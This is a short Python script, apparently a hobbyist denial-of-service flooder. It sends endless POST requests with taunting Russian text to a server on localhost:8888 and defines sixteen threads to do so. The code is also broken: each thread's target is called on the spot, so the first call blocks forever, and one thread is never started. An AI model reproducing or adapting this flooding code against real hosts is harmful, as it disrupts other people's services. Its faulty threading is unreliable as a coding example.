import requests
from threading import Thread

def ddos():
    while True:
        data = {
            "title": "Это Дудос детка",
            "text": "ты ничего не сделаешь"
        }
        requests.post("http://localhost:8888/", data)

thread1 = Thread(target=ddos())
thread2 = Thread(target=ddos())
thread3 = Thread(target=ddos())
thread4 = Thread(target=ddos())
thread5 = Thread(target=ddos())
thread6 = Thread(target=ddos())
thread7 = Thread(target=ddos())
thread8 = Thread(target=ddos())
thread9 = Thread(target=ddos())
thread10 = Thread(target=ddos())
thread11 = Thread(target=ddos())
thread12 = Thread(target=ddos())
thread13 = Thread(target=ddos())
thread14 = Thread(target=ddos())
thread15 = Thread(target=ddos())
thread16 = Thread(target=ddos())

thread1.start()
thread2.start()
thread3.start()
thread4.start()
thread5.start()
thread6.start()
thread7.start()
thread9.start()
thread10.start()
thread11.start()
thread12.start()
thread13.start()
thread14.start()
thread15.start()
thread16.start()